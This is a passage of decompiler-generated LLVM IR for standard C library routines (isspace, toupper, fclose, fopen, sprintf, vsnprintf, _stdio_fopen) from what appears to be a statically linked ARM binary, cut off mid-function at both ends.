  br i1 %tmp, label %dec_label_pc_13210, label %dec_label_pc_13200

dec_label_pc_13200:                               ; preds = %entry
  %v0_13200 = call i32 @__GI___errno_location()
  %v0_13204 = load i32, i32* %r7.global-to-local, align 4
  %v1_13204 = sub i32 0, %v0_13204
  %v2_13208 = inttoptr i32 %v0_13200 to i32*
  store i32 %v1_13204, i32* %v2_13208, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13210.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13210

dec_label_pc_13210:                               ; preds = %entry, %dec_label_pc_13200
  %v1_13214 = phi i32 [ %v0_131f0, %entry ], [ -1, %dec_label_pc_13200 ]
  %v2_13210 = phi i32 [ %v3_131e4, %entry ], [ %v2_13210.pre, %dec_label_pc_13200 ]
  store i32 %v2_13210, i32* @r7, align 4
  ret i32 %v1_13214

; uselistorder directives
  uselistorder i32 %v0_131f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13210, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_13224 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 676) to i32*), align 4
  %v2_13228 = mul i32 %arg1, 2
  %v2_1322c = add i32 %v4_13224, %v2_13228
  %v3_1322c = inttoptr i32 %v2_1322c to i16*
  %v4_1322c = load i16, i16* %v3_1322c, align 2
  %v6_1322c = zext i16 %v4_1322c to i32
  %v1_13230 = and i32 %v6_1322c, 32
  ret i32 %v1_13230
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_13244 = add i32 %arg1, 128
  %v2_13248 = icmp ugt i32 %v1_13244, 383
  %v0_13250 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13248, i32 %v0_13250)
  %v4_13258 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 684) to i32*), align 4
  %v2_1325c = mul i32 %arg1, 2
  %v2_13260 = add i32 %v4_13258, %v2_1325c
  %v3_13260 = inttoptr i32 %v2_13260 to i16*
  %v4_13260 = load i16, i16* %v3_13260, align 2
  %v6_13260 = sext i16 %v4_13260 to i32
  ret i32 %v6_13260
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 26448)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1328c = load i32, i32* @r4, align 4
  store i32 %v3_1328c, i32* %stack_var_-36, align 4
  %v6_1328c = load i32, i32* @r5, align 4
  %v9_1328c = load i32, i32* @r6, align 4
  %v12_1328c = load i32, i32* @r7, align 4
  %v15_1328c = load i32, i32* @r8, align 4
  %v27_1328c = load i32, i32* @lr, align 4
  %v2_13290 = add i32 %tmp, 52
  %v3_13290 = inttoptr i32 %v2_13290 to i32*
  %v4_13290 = load i32, i32* %v3_13290, align 4
  %v1_13298 = sub i32 1, %v4_13290
  %v2_13298 = icmp ult i32 %v4_13290, 2
  br i1 %v2_13298, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_13298, %entry ]
  %v0_132a0 = phi i32 [ 0, %bb ], [ %v1_13298, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_132a0 = icmp eq i32 %v0_132a0, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  br i1 %v2_132a0, label %dec_label_pc_132ec, label %dec_label_pc_132b4

dec_label_pc_132b4:                               ; preds = %thread-pre-split
  %v4_132cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_132cc)
  %v0_132e0 = load i32, i32* @r6, align 4
  %v2_132e0 = add i32 %v0_132e0, 16
  %v3_132e0 = inttoptr i32 %v2_132e0 to i32*
  %v4_132e0 = load i32, i32* %v3_132e0, align 4
  call void @__pseudo_branch(i32 %v4_132e0)
  %v0_132ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %thread-pre-split, %dec_label_pc_132b4
  %v1_132f4 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_132ec.pre, %dec_label_pc_132b4 ]
  %v1_132ec = inttoptr i32 %v1_132f4 to i16*
  %v2_132ec = load i16, i16* %v1_132ec, align 2
  %v3_132ec = zext i16 %v2_132ec to i32
  %v1_132f0 = and i32 %v3_132ec, 64
  %v2_132f0 = icmp eq i32 %v1_132f0, 0
  br i1 %v2_132f0, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_132ec
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_132ec, %bb17
  %storemerge24 = phi i32 [ %v1_132f4, %bb17 ], [ %v1_132f0, %dec_label_pc_132ec ]
  %v1_132f8 = xor i1 %v2_132f0, true
  call void @__pseudo_cond_branch(i1 %v1_132f8, i32 ptrtoint (i32* @global_var_14da4.846 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_13300 = load i32, i32* @r5, align 4
  %v1_13300 = add i32 %v0_13300, 4
  %v2_13300 = inttoptr i32 %v1_13300 to i32*
  %v3_13300 = load i32, i32* %v2_13300, align 4
  %v1_13304 = call i32 @__GI_close(i32 %v3_13300)
  %v0_1330c = load i32, i32* @r6, align 4
  %v2_13318 = add i32 %v0_1330c, 112
  %v3_13318 = inttoptr i32 %v2_13318 to i32*
  %v4_13318 = load i32, i32* %v3_13318, align 4
  store i32 %v4_13318, i32* @r7, align 4
  %v1_13320 = load i32, i32* @r5, align 4
  %v2_13320 = add i32 %v1_13320, 4
  %v3_13320 = inttoptr i32 %v2_13320 to i32*
  store i32 -1, i32* %v3_13320, align 4
  %v0_13328 = load i32, i32* @r6, align 4
  %v2_13328 = add i32 %v0_13328, 76
  %v3_13328 = inttoptr i32 %v2_13328 to i32*
  %v4_13328 = load i32, i32* %v3_13328, align 4
  %v1_13330 = icmp slt i32 %v1_13304, 0
  store i32 %v4_13328, i32* %stack_var_-80, align 4
  br i1 %v1_13330, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_13328)
  %v0_13358 = load i32, i32* @r6, align 4
  %v2_13358 = add i32 %v0_13358, 16
  %v3_13358 = inttoptr i32 %v2_13358 to i32*
  %v4_13358 = load i32, i32* %v3_13358, align 4
  call void @__pseudo_branch(i32 %v4_13358)
  %v0_13368 = load i32, i32* @r6, align 4
  %v2_13368 = add i32 %v0_13368, 12
  %v3_13368 = inttoptr i32 %v2_13368 to i32*
  %v4_13368 = load i32, i32* %v3_13368, align 4
  %v1_1336c = inttoptr i32 %v4_13368 to i32*
  %v2_1336c = load i32, i32* %v1_1336c, align 4
  %v1_13374 = add i32 %v2_1336c, 1
  %v2_13378 = add i32 %v0_13368, 24
  %v3_13378 = inttoptr i32 %v2_13378 to i32*
  %v4_13378 = load i32, i32* %v3_13378, align 4
  store i32 %v4_13378, i32* @r4, align 4
  store i32 %v1_13374, i32* %v1_1336c, align 4
  call void @__pseudo_branch(i32 %v4_13378)
  %v0_13390 = load i32, i32* @r5, align 4
  %v1_13390 = inttoptr i32 %v0_13390 to i16*
  %v2_13390 = load i16, i16* %v1_13390, align 2
  %v1_13394 = and i16 %v2_13390, 24576
  %v1_13398 = or i16 %v1_13394, 48
  %v0_1339c = load i32, i32* %sb.global-to-local, align 4
  %v2_1339c = icmp eq i32 %v0_1339c, 0
  store i16 %v1_13398, i16* %v1_13390, align 2
  br i1 %v2_1339c, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_133b0 = xor i1 %v2_1339c, true
  call void @__pseudo_cond_branch(i1 %v2_133b0, i32 %v4_13378)
  %v0_133b4 = load i32, i32* @r5, align 4
  %v1_133b4 = inttoptr i32 %v0_133b4 to i16*
  %v2_133b4 = load i16, i16* %v1_133b4, align 2
  %v1_133b8 = and i16 %v2_133b4, 16384
  %v2_133b8 = icmp eq i16 %v1_133b8, 0
  br i1 %v2_133b8, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_133c0 = xor i1 %v2_133b8, true
  call void @__pseudo_cond_branch(i1 %v1_133c0, i32 ptrtoint (i32* @global_var_16e04.850 to i32))
  %v2_133cc = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_133cc)
  call void @__pseudo_branch(i32 %v4_13358)
  %v0_133ec = load i32, i32* @r6, align 4
  %v2_133ec = add i32 %v0_133ec, 52
  %v3_133ec = inttoptr i32 %v2_133ec to i32*
  %v4_133ec = load i32, i32* %v3_133ec, align 4
  %v1_133f0 = inttoptr i32 %v4_133ec to i32*
  %v2_133f0 = load i32, i32* %v1_133f0, align 4
  %v1_133f4 = add i32 %v2_133f0, 1
  store i32 %v1_133f4, i32* %v1_133f0, align 4
  call void @__pseudo_branch(i32 %v4_13378)
  %v0_1340c = call i32 @_stdio_openlist_dec_use()
  %v0_13410 = load i32, i32* %sl.global-to-local, align 4
  %v2_13418 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13418, i32* @r4, align 4
  store i32 %v6_1328c, i32* @r5, align 4
  store i32 %v9_1328c, i32* @r6, align 4
  store i32 %v12_1328c, i32* @r7, align 4
  store i32 %v15_1328c, i32* @r8, align 4
  store i32 %v27_1328c, i32* @lr, align 4
  ret i32 %v0_13410

; uselistorder directives
  uselistorder i1 %v2_133b8, { 1, 0 }
  uselistorder i32 %v4_13378, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13298, { 1, 0 }
  uselistorder i32 %v4_13290, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_13424(i32 %arg1) local_unnamed_addr {
dec_label_pc_13424:
  %v0_13424 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13424, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_13424
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13424, %bb
  %v10_1343c = phi i32 [ %arg1, %dec_label_pc_13424 ], [ 0, %bb ]
  ret i32 %v10_1343c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_13450 = call i32 @_stdio_fopen()
  ret i32 %v0_13450
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_1346c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1346c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_13480 = call i32 @__GI_vsnprintf()
  ret i32 %v0_13480

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_13494 = load i32, i32* @r4, align 4
  %v6_13494 = load i32, i32* @r5, align 4
  %v9_13494 = load i32, i32* @r6, align 4
  %v12_13494 = load i32, i32* @r7, align 4
  %v18_13494 = load i32, i32* @sl, align 4
  %v2_1349c = ptrtoint i32* %stack_var_-112 to i32
  %v0_134a0 = load i32, i32* @r0, align 4
  store i32 %v0_134a0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_134a8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_134a8, i32* @r0, align 4
  %v0_134b0 = load i32, i32* @r3, align 4
  store i32 %v0_134b0, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_134bc = load i32, i32* @r1, align 4
  store i32 %v0_134bc, i32* @r5, align 4
  %v0_134c0 = load i32, i32* @r2, align 4
  store i32 %v0_134c0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_134d4 = call i32 @__stdio_init_mutex(i32 %v2_134a8)
  %v0_134d8 = load i32, i32* @r4, align 4
  %v1_134d8 = sub i32 -1, %v0_134d8
  %v0_134dc = load i32, i32* @r5, align 4
  %v3_134dc = icmp ult i32 %v0_134dc, %v1_134d8
  br i1 %v3_134dc, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_134d8, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_134e4 = phi i32 [ %v0_134dc, %entry ], [ %v1_134d8, %bb ]
  %v2_134e4 = add i32 %v1_134e4, %v0_134d8
  %v0_134ec = load i32, i32* @r6, align 4
  %v0_134f0 = load i32, i32* @r7, align 4
  %v0_134fc = load i32, i32* @sl, align 4
  %v5_13508 = inttoptr i32 %v0_134d8 to i8*
  %v15_13510 = inttoptr i32 %v0_134ec to i8*
  %v16_13510 = call i32 @_vfprintf_internal(i32 %v2_1349c, i8* %v15_13510, i32 %v0_134f0, i32 %v2_134e4, i32 %v0_134d8, i32 %v2_134e4, i32 %v0_134d8, i32 %v0_134d8, i32 %v0_134d8, i32 %v2_134e4, i32 %v0_134fc)
  %v0_13514 = load i32, i32* @r5, align 4
  %v1_13514 = load i32, i32* @sl, align 4
  %v9_13514 = icmp eq i32 %v0_13514, %v1_13514
  br i1 %v9_13514, label %dec_label_pc_1353c, label %dec_label_pc_13520

dec_label_pc_13520:                               ; preds = %bb26
  %v3_134e4 = inttoptr i32 %v2_134e4 to i8*
  %v9_13528 = icmp eq i8* %v5_13508, %v3_134e4
  br i1 %v9_13528, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_13520
  %v2_1352c = add i32 %v0_134d8, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13520, %bb27
  %v1_13530 = phi i32 [ %v2_134e4, %dec_label_pc_13520 ], [ %v2_1352c, %bb27 ]
  %v6_13530 = inttoptr i32 %v1_13530 to i8*
  %stack_var_-96.0 = select i1 %v9_13528, i8* %v6_13530, i8* %v5_13508
  %v1_13538 = trunc i32 %v1_13514 to i8
  store i8 %v1_13538, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %bb26, %bb28
  store i32 %v3_13494, i32* @r4, align 4
  store i32 %v6_13494, i32* @r5, align 4
  store i32 %v9_13494, i32* @r6, align 4
  store i32 %v12_13494, i32* @r7, align 4
  store i32 %v18_13494, i32* @sl, align 4
  ret i32 %v16_13510

; uselistorder directives
  uselistorder i32 %v2_134e4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_134d8, { 2, 1, 0 }
  uselistorder i32 %v0_134d8, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_1353c, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13548 = load i32, i32* @r4, align 4
  store i32 %v3_13548, i32* %stack_var_-36, align 4
  %v6_13548 = load i32, i32* @r5, align 4
  %v9_13548 = load i32, i32* @r6, align 4
  %v18_13548 = load i32, i32* @sb, align 4
  %v24_13548 = load i32, i32* @fp, align 4
  %v0_1354c = load i32, i32* @r1, align 4
  %v1_1354c = inttoptr i32 %v0_1354c to i8*
  %v2_1354c = load i8, i8* %v1_1354c, align 1
  %v3_1354c = zext i8 %v2_1354c to i32
  store i32 %v3_1354c, i32* @ip, align 4
  %v7_13554 = icmp eq i8 %v2_1354c, 114
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @fp, align 4
  %v2_1355c = ptrtoint i32* %stack_var_-72 to i32
  %v0_13560 = load i32, i32* @r0, align 4
  store i32 %v0_13560, i32* @r6, align 4
  %v0_13564 = load i32, i32* @r2, align 4
  store i32 %v0_13564, i32* @sb, align 4
  %v0_13568 = load i32, i32* @r3, align 4
  store i32 %v0_13568, i32* @r5, align 4
  br i1 %v7_13554, label %dec_label_pc_135b4, label %dec_label_pc_13570

dec_label_pc_13570:                               ; preds = %entry
  %v7_13570 = icmp eq i8 %v2_1354c, 119
  br i1 %v7_13570, label %bb, label %dec_label_pc_1357c

bb:                                               ; preds = %dec_label_pc_13570
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_135b8

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13570
  %v7_1357c = icmp eq i8 %v2_1354c, 97
  br i1 %v7_1357c, label %bb34, label %dec_label_pc_13588

bb34:                                             ; preds = %dec_label_pc_1357c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_135b8

dec_label_pc_13588:                               ; preds = %dec_label_pc_1357c, %dec_label_pc_1363c, %dec_label_pc_13610
  %v0_13588 = call i32 @__GI___errno_location()
  store i32 %v0_13588, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_13590 = load i32, i32* @sb, align 4
  %v2_13590 = icmp eq i32 %v0_13590, 0
  %v2_13594 = inttoptr i32 %v0_13588 to i32*
  store i32 22, i32* %v2_13594, align 4
  br i1 %v2_13590, label %dec_label_pc_13808, label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13660._crit_edge, %dec_label_pc_13588
  %v0_1359c = load i32, i32* @sb, align 4
  %v1_1359c = inttoptr i32 %v0_1359c to i16*
  %v2_1359c = load i16, i16* %v1_1359c, align 2
  %v3_1359c = zext i16 %v2_1359c to i32
  store i32 %v3_1359c, i32* %r3.global-to-local, align 4
  %v1_135a0 = and i32 %v3_1359c, 8192
  %v2_135a0 = icmp eq i32 %v1_135a0, 0
  br i1 %v2_135a0, label %dec_label_pc_13808, label %dec_label_pc_135a8

dec_label_pc_135a8:                               ; preds = %dec_label_pc_1359c
  store i32 %v0_1359c, i32* @r0, align 4
  %v0_135ac = call i32 @free()
  store i32 %v0_135ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13808

dec_label_pc_135b4:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %bb, %bb34, %dec_label_pc_135b4
  %v1_135d0 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_135b4 ]
  %v1_135b8 = add i32 %v0_1354c, 1
  %v2_135b8 = inttoptr i32 %v1_135b8 to i8*
  %v3_135b8 = load i8, i8* %v2_135b8, align 1
  %v7_135bc = icmp eq i8 %v3_135b8, 98
  %v1_135b8.v0_1354c = select i1 %v7_135bc, i32 %v1_135b8, i32 %v0_1354c
  store i32 %v1_135b8.v0_1354c, i32* %r3.global-to-local, align 4
  %v1_135c8 = add i32 %v1_135b8.v0_1354c, 1
  %v2_135c8 = inttoptr i32 %v1_135c8 to i8*
  %v3_135c8 = load i8, i8* %v2_135c8, align 1
  %v4_135c8 = zext i8 %v3_135c8 to i32
  store i32 %v4_135c8, i32* @r3, align 4
  %v7_135cc = icmp eq i8 %v3_135c8, 43
  br i1 %v7_135cc, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_135b8
  store i32 %v1_135d0, i32* @r3, align 4
  %v2_135d4 = add nuw nsw i32 %v1_135d0, 1
  store i32 %v2_135d4, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_135b8, %bb37
  %v2_135d8 = icmp eq i32 %v0_13564, 0
  br i1 %v2_135d8, label %dec_label_pc_135e0, label %dec_label_pc_13608

dec_label_pc_135e0:                               ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_135e4 = call i32 @malloc(i32 80)
  store i32 %v1_135e4, i32* %r0.global-to-local, align 4
  store i32 %v1_135e4, i32* @sb, align 4
  %v3_135e8 = icmp eq i32 %v1_135e4, 0
  br i1 %v3_135e8, label %dec_label_pc_1380c, label %dec_label_pc_135f0

dec_label_pc_135f0:                               ; preds = %dec_label_pc_135e0
  %v2_135f4 = add i32 %v1_135e4, 8
  %v3_135f4 = inttoptr i32 %v2_135f4 to i32*
  store i32 0, i32* %v3_135f4, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_135fc = load i32, i32* @sb, align 4
  %v3_135fc = inttoptr i32 %v2_135fc to i16*
  store i16 8192, i16* %v3_135fc, align 2
  %v0_13600 = load i32, i32* @sb, align 4
  %v1_13600 = add i32 %v0_13600, 56
  store i32 %v1_13600, i32* @r0, align 4
  %v1_13604 = call i32 @__stdio_init_mutex(i32 %v1_13600)
  store i32 %v1_13604, i32* %r0.global-to-local, align 4
  %v0_13608.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13608

dec_label_pc_13608:                               ; preds = %.thread5, %dec_label_pc_135f0
  %v0_13660 = phi i32 [ %v0_13568, %.thread5 ], [ %v0_13608.pre, %dec_label_pc_135f0 ]
  %v1_13608 = icmp slt i32 %v0_13660, 0
  br i1 %v1_13608, label %dec_label_pc_13660, label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_13608
  %v0_13614 = load i32, i32* @r4, align 4
  %v2_13614 = and i32 %v0_13614, ptrtoint ([43 x i8]* @global_var_20003.856 to i32)
  %v1_13618 = or i32 %v2_13614, 1
  store i32 %v1_13618, i32* %r2.global-to-local, align 4
  %v0_1361c = load i32, i32* @r6, align 4
  %v1_1361c = add i32 %v0_1361c, 1
  %v2_13620 = and i32 %v1_1361c, %v1_13618
  store i32 %v2_13620, i32* %r3.global-to-local, align 4
  %v9_13624 = icmp eq i32 %v2_13620, %v1_13618
  %v1_13628 = load i32, i32* @sb, align 4
  %v2_13628 = add i32 %v1_13628, 4
  %v3_13628 = inttoptr i32 %v2_13628 to i32*
  store i32 %v0_13660, i32* %v3_13628, align 4
  br i1 %v9_13624, label %dec_label_pc_13630, label %dec_label_pc_13588

dec_label_pc_13630:                               ; preds = %dec_label_pc_13610
  %v0_13630 = load i32, i32* @r4, align 4
  %v1_13630 = load i32, i32* @r6, align 4
  %v2_13630 = sub i32 -1, %v1_13630
  %v3_13630 = and i32 %v0_13630, %v2_13630
  store i32 %v3_13630, i32* @r3, align 4
  %v1_13634 = and i32 %v3_13630, 1024
  %v2_13634 = icmp eq i32 %v1_13634, 0
  br i1 %v2_13634, label %dec_label_pc_13654, label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_13630
  %v0_1363c = load i32, i32* @r5, align 4
  store i32 %v0_1363c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_13648 = call i32 @__libc_fcntl(i32 %v0_1363c, i32 4)
  store i32 %v2_13648, i32* %r0.global-to-local, align 4
  %v2_1364c = icmp eq i32 %v2_13648, 0
  br i1 %v2_1364c, label %dec_label_pc_1363c.dec_label_pc_13654_crit_edge, label %dec_label_pc_13588

dec_label_pc_1363c.dec_label_pc_13654_crit_edge:  ; preds = %dec_label_pc_1363c
  %v0_13654.pre = load i32, i32* @r6, align 4
  %v0_13658.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %dec_label_pc_1363c.dec_label_pc_13654_crit_edge, %dec_label_pc_13630
  %v0_13658 = phi i32 [ %v0_13658.pre, %dec_label_pc_1363c.dec_label_pc_13654_crit_edge ], [ %v0_13630, %dec_label_pc_13630 ]
  %v0_13654 = phi i32 [ %v0_13654.pre, %dec_label_pc_1363c.dec_label_pc_13654_crit_edge ], [ %v1_13630, %dec_label_pc_13630 ]
  %v1_13654 = and i32 %v0_13654, 131072
  store i32 %v1_13654, i32* %r3.global-to-local, align 4
  %v2_13658 = or i32 %v1_13654, %v0_13658
  store i32 %v2_13658, i32* @r4, align 4
  br label %dec_label_pc_13684

dec_label_pc_13660:                               ; preds = %dec_label_pc_13608
  %v7_13660 = icmp eq i32 %v0_13660, -1
  %v0_1366c.pre = load i32, i32* @r4, align 4
  br i1 %v7_13660, label %dec_label_pc_13660._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_13660
  %v2_13664 = or i32 %v0_1366c.pre, ptrtoint ([46 x i8]* @global_var_20000.857 to i32)
  store i32 %v2_13664, i32* @r4, align 4
  br label %dec_label_pc_13660._crit_edge

dec_label_pc_13660._crit_edge:                    ; preds = %dec_label_pc_13660, %bb38
  %v0_1366c = phi i32 [ %v2_13664, %bb38 ], [ %v0_1366c.pre, %dec_label_pc_13660 ]
  %v0_13668 = load i32, i32* @r6, align 4
  store i32 %v0_13668, i32* %r0.global-to-local, align 4
  store i32 %v0_1366c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_13674 = call i32 @__GI_open(i32 %v0_13668, i32 %v0_1366c)
  store i32 %v2_13674, i32* %r0.global-to-local, align 4
  %v1_13678 = icmp slt i32 %v2_13674, 0
  %v1_1367c = load i32, i32* @sb, align 4
  %v2_1367c = add i32 %v1_1367c, 4
  %v3_1367c = inttoptr i32 %v2_1367c to i32*
  store i32 %v2_13674, i32* %v3_1367c, align 4
  br i1 %v1_13678, label %dec_label_pc_1359c, label %.dec_label_pc_13684_crit_edge

.dec_label_pc_13684_crit_edge:                    ; preds = %dec_label_pc_13660._crit_edge
  %v0_13688.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13684

dec_label_pc_13684:                               ; preds = %.dec_label_pc_13684_crit_edge, %dec_label_pc_13654
  %v0_136a0 = phi i32 [ %v0_13688.pre, %.dec_label_pc_13684_crit_edge ], [ %v2_13658, %dec_label_pc_13654 ]
  %v0_13684 = load i32, i32* @sb, align 4
  %v1_13684 = inttoptr i32 %v0_13684 to i16*
  %v2_13684 = load i16, i16* %v1_13684, align 2
  %v3_13684 = zext i16 %v2_13684 to i32
  %v1_13688 = urem i32 %v0_136a0, 4
  %v1_1368c = and i32 %v0_136a0, 1024
  %v1_13690 = and i32 %v3_13684, 8192
  %v1_13694 = add nuw nsw i32 %v1_13688, 1
  %v2_13698 = or i32 %v1_13690, %v1_1368c
  store i32 %v2_13698, i32* %r3.global-to-local, align 4
  %v1_1369c = xor i32 %v1_13694, 3
  store i32 %v1_1369c, i32* %r1.global-to-local, align 4
  %v1_136a0 = and i32 %v0_136a0, ptrtoint ([46 x i8]* @global_var_20000.857 to i32)
  store i32 %v1_136a0, i32* %r2.global-to-local, align 4
  %v2_136a0 = icmp eq i32 %v1_136a0, 0
  %v1_136a4 = add i32 %v0_13684, 4
  %v2_136a4 = inttoptr i32 %v1_136a4 to i32*
  %v3_136a4 = load i32, i32* %v2_136a4, align 4
  store i32 %v3_136a4, i32* @r5, align 4
  br i1 %v2_136a0, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_13684
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_13684, %bb39
  %v0_136b0 = phi i32 [ 0, %dec_label_pc_13684 ], [ 32768, %bb39 ]
  %v4_136ac = mul nuw nsw i32 %v1_1369c, 16
  %v5_136ac = or i32 %v2_13698, %v4_136ac
  store i32 %v5_136ac, i32* %r3.global-to-local, align 4
  %v2_136b0 = or i32 %v0_136b0, %v5_136ac
  store i32 %v2_136b0, i32* %r2.global-to-local, align 4
  %v8_136b4 = icmp eq i32 %v3_136a4, 2147483647
  %v1_136b8 = trunc i32 %v2_136b0 to i16
  store i16 %v1_136b8, i16* %v1_13684, align 2
  br i1 %v8_136b4, label %dec_label_pc_136e8, label %dec_label_pc_136c0

dec_label_pc_136c0:                               ; preds = %bb40
  %v0_136c0 = call i32 @__GI___errno_location()
  store i32 %v0_136c0, i32* @r4, align 4
  %v0_136c8 = load i32, i32* @r5, align 4
  store i32 %v0_136c8, i32* @r0, align 4
  %v1_136cc = inttoptr i32 %v0_136c0 to i32*
  %v2_136cc = load i32, i32* %v1_136cc, align 4
  store i32 %v2_136cc, i32* @r5, align 4
  %v1_136d0 = call i32 @isatty(i32 %v0_136c8)
  store i32 %v1_136d0, i32* %r0.global-to-local, align 4
  %v2_136d4 = icmp eq i32 %v1_136d0, 0
  br i1 %v2_136d4, label %.thread7, label %bb41

